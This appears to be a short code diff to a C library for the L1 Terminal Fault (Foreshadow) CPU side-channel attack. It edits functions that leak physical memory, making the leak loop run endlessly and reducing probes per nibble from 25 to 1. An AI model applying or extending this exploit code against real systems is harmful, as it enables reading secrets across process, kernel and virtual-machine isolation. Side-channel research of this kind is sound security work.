@@ -320,7 +320,7 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   size_t *assembled_results = malloc(length * sizeof(size_t));
   const int bytes_per_line = 16;
 
-  for (int iter = 1; iter <= 1000; ++iter) {
+  while (1) {
     for (int x = 0; x < 10; ++x) {
       for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
         void *leak_addr = (char *)leak.leak + j;
@@ -453,7 +453,7 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
 
 size_t l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_buffer,
                                       void (*l1tf_leak_function)(void *, reload_buffer_t)) {
-  const size_t nr_of_probes = 25;
+  const size_t nr_of_probes = 1;
   const size_t probe_size = AMOUNT_OF_OPTIONS_IN_NIBBLE * sizeof(size_t);
   size_t *probes = malloc(probe_size);
   memset(probes, 0, probe_size);
